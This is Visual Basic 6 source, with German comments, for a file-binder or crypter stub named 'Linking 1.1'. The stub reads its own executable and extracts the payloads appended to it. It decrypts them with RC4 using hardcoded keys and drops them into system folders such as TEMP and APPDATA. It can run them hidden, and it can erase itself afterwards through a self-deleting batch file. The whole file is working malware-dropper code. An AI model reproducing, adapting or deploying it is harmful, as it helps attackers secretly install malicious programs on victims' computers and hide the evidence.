VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Linking 1.1"
   ClientHeight    =   3255
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   8655
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3255
   ScaleWidth      =   8655
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text1 
      Height          =   3015
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   8415
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    Dim SEF As String
    SEF = "£Ú±}G±}GÃÖM/áÅ±}GË"
    Dim SPF As String
    SPF = "~ÿIñu°Sáûí8°DOÓ®oy"
    
    Dim alless As String

    
    Dim F As Integer
    F = FreeFile
    
    Dim G As Integer
    G = FreeFile
    
   Dim InstallPath As String

    
    logg "Start to Stub"
    logg App.Path & "\" & App.EXEName & ".exe"
    'Open "C:\1.exe" For Binary Access Read As #F 'path und datei öffnen
    Open App.Path & "\" & App.EXEName & ".exe" For Binary As #F  ' Access Read As #F 'path und datei öffnen
        alless = Space(LOF(F))                    'Die ganze datei einlesen
        Get #F, , alless                          'datei auf alles
    Close #F
    
    logg "Read finished"
    
    
    Dim FindData() As String 'die dateien vm builder werden ausfindig gemacht.
    FindData() = Split(alless, "ß¤A:m c¥ø/×÷")
    
    
    Dim allsplit() As String
    allsplit() = Split(FindData(1), SPF)
    logg "Files to unpack" & vbTab & UBound(allsplit()) - 1
    logg "NL"
    
    Dim stubsettings() As String
    
    allsplit(0) = RC4(allsplit(0), "G±}GÃÖM/áÅ±}")
    stubsettings() = Split(allsplit(0), SEF)
    'MsgBox stubsettings(0)
    HiddenStub = stubsettings(0)
    

    'MsgBox "set1"
    MeltStub = stubsettings(1)
    UseRC4 = stubsettings(2)

        Dim X As Integer

        For X = 1 To UBound(allsplit()) - 1 Step 1
        'MsgBox UseRC4
        If UseRC4 = 1 Then
        logg "enpack file rc4"
        allsplit(X) = RC4(allsplit(X), "SáÓáÅ±")
        logg "DONE"
        End If
        
        Dim FileSettings() As String
        FileSettings() = Split(allsplit(X), SEF)
        
    'Hierfür kommt noch ne function :D
    FileSettings(0) = Replace(FileSettings(0), "%apppath%", App.Path)
    FileSettings(0) = Replace(FileSettings(0), "%tempdir%", Environ("TEMP"))
    FileSettings(0) = Replace(FileSettings(0), "%windir%", Environ("windir"))
    FileSettings(0) = Replace(FileSettings(0), "%appdata%", Environ("APPDATA"))
    FileSettings(0) = Replace(FileSettings(0), "%systemdrive%", Environ("SystemDrive"))
    FileSettings(0) = Replace(FileSettings(0), "%programfiles%", Environ("ProgramFiles"))
    FileSettings(0) = Replace(FileSettings(0), "%userprofile%", Environ("USERPROFILE"))
    
    InstallPath = FileSettings(0)
        'MsgBox InstallPath
        logg "Unpack File:" & vbTab & X
        logg "Filename:" & vbTab & FileSettings(1)
        logg "Unpack to:" & vbTab & InstallPath & "\" & FileSettings(1)
'-------------- Existiert der Ordner ? -----------------------'
Dim fs As Object ', MyNewWb As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FolderExists(InstallPath) = True Then GoTo FEXIST 'wenn ja, überspringe diesen teil.
'wenn nicht, teste den ganzen paht, und erstelle dei nicht vorhandenen
        
        Dim EF As Integer
        Dim EU As String
        Dim ex() As String
        
        EU = ""
        'MsgBox InstallPath
        ex() = Split(InstallPath, "\")
        EU = ex(0) & "\"
        'MsgBox ex(0)
        For EF = 1 To UBound(ex())
            EU = EU & "\" & ex(EF)
            CreateFolder EU
        Next EF
        
FEXIST:
'------------- End Existiert der Ordner ------------------------'

'MsgBox "install"
            Open InstallPath & "\" & FileSettings(1) For Binary Access Write As #G 'path und datei zum speichern öffnen
                Put #G, 1, FileSettings(2)                 'Speichern
                
    Close #G
    
    
    Select Case FileSettings(3)
        Case "visible"
            ShellExecute 0, "open", (InstallPath & "\" & FileSettings(1)), vbNullString, vbNullString, 1
            logg " executed (visible)"
        Case "hidden"
            ShellExecute 0, "open", (InstallPath & "\" & FileSettings(1)), vbNullString, vbNullString, 0
            logg " executed (hidden)"
        Case Else
            logg " not executed"
    End Select
    
    logg "NL"
    Next X
    If HiddenStub = 0 Then GoTo nomore
    If MeltStub = 1 Then
            Open (Environ("SystemDrive") & "\ciao.bat") For Output As #F
            Print #F, "@echo off"
            Print #F, "del " & Chr(34) & App.Path & "\" & App.EXEName & ".exe" & Chr(34)
            Print #F, "del %0"
        Close
        ShellExecute 0, "open", (Environ("SystemDrive") & "\ciao.bat"), vbNullString, vbNullString, 0
        'MsgBox "melstsub"
    End If
    If HiddenStub = 1 Then End
nomore:
    If HiddenStub = 0 Then
    Me.Visible = True
    End If
End Sub

Private Sub logg(log As String)
    If HiddenStub = 1 Then Exit Sub
    
    If log = "NL" Then
        Text1.Text = Text1.Text & vbNewLine
        Exit Sub
    End If
    
    Text1.Text = Text1.Text & Time & "  " & log & vbNewLine
End Sub




